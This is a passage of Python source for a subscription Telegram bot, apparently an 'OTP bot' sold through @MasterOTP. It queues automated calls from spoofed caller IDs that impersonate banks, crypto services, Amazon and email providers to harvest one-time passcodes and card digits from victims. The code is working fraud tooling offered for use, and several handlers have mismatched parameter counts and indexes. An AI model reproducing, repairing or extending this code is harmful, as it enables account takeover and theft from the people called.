        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' is a number.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "amazon",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': "Amazon",
                'name': message_parts[3],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
        
# /bank
async def bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 6:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /bank number spoofnumber bank name otpdigits.")
        return

    number = message_parts[1]
    spoof = message_parts[2]

    if not (number.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'otpdigits' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "bank",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'bank': message_parts[3],
                'name': message_parts[4],
                'otpdigits': message_parts[5],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
        
# /crypto
async def crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 6:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /crypto number spoofnumber service name otpdigits last4digits.")
        return

    number = message_parts[1]
    spoof = message_parts[2]

    if not (number.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'otpdigits' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "crypto",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': message_parts[3],
                'name': message_parts[4],
                'otpdigits': message_parts[5],
                'last4digits': message_parts[6],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
          
# /live
async def live(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 6:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /live number spoofnumber service name otpdigits.")
        return

    number = message_parts[1]
    spoof = message_parts[2]
    otpdigits = message_parts[5]

    if not (number.isdigit() and otpdigits.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'otpdigits' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "live",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': message_parts[3],
                'name': message_parts[4],
                'otpdigits': message_parts[5],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
        
# /email
async def email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 5:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /email number spoofnumber service name.")
        return

    number = message_parts[1]
    spoof = message_parts[2]
    otpdigits = message_parts[5]

    if not (number.isdigit() and otpdigits.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' is a number.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "email",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': message_parts[3],
                'name': message_parts[4],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")

# / pgp       
async def pgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    print(f"today time {today}")
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    print("PGP COMMAND CALLED")
    # Check if the user is an admin
    if update.message.from_user.id not in admins:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="You are not authorized to use this command.")
        return
    
    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 3:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /pgp number spoofnumber yournumber")
        return

    number = message_parts[1]
    spoof = message_parts[2]
    yournumber = message_parts[3]

    if not (number.isdigit() and yournumber.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'yournumber' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    print("STEP 2")
    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "pgp",
                'number': yournumber,
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'targetnumber': number,
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            print("STEP 3")
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
        
